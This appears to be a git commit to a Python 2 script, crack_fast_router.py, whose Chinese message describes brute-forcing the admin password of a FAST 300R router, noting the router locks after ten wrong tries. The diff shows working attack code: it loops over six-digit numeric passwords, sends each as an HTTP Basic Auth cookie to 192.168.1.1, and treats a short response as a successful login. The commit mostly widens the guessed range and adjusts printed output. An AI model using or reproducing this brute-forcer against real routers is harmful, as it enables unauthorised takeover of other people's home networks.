4f9a6691f15718c54b88da49cab09e275284dc12
arckal <arckalsun@gmail.com>
2016-08-25 23:25:41 -0500

    爆破路由器FAST 300R 密码（错误达到10次后，路由器锁定两小时）

--- crack_fast_router.py
+++ crack_fast_router.py
@@ -5,6 +5,7 @@
 # administrator address: 192.168.1.1
 #
 import urllib2,base64
+host_address = '192.168.1.1'
 
 def crack(str_pwd):
 	
@@ -12,13 +13,14 @@ def crack(str_pwd):
 	cookies = 'Authorization=Basic%20'+base64.b64encode('admin:'+str_pwd)
 	
 	url = r'http://'+host_address
+	
 	data = ''
 	headers = {'Host':host_address,'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) ','Cookie': cookies,'Cache-Control':'max-age=0','Connection':'keep-alive'}
 
 	req = urllib2.Request(url,data,headers)
 	r = urllib2.urlopen(req)
 	html = r.read()
-	#print len(html)
+	print len(html)
 
 	if len(html) < 3000:	#len(html)=2086
 		#print 'Login Success!'
@@ -32,17 +34,18 @@ def crack(str_pwd):
 
 if __name__ == '__main__':
 
-	host_address = '192.168.1.1'
 	passwd = ''
 	count = 0
 	
 	# crack 6-digit password
-	for i in range(123440,123457,1):
+	for i in range(123440,123467,1):
+		print 'Checking %5d' % count+':\t'+str(i)
 		if(crack(str(i))):
 			passwd = str(i)
+			print chr(7)+'Found password: '+passwd
 			break
 		count += 1
-		print 'Checking '+str(count)+':'+str(i)
+		
 	
-	print '*'*80
-	print 'Found password: '+passwd
+	print 'Done!'
+	
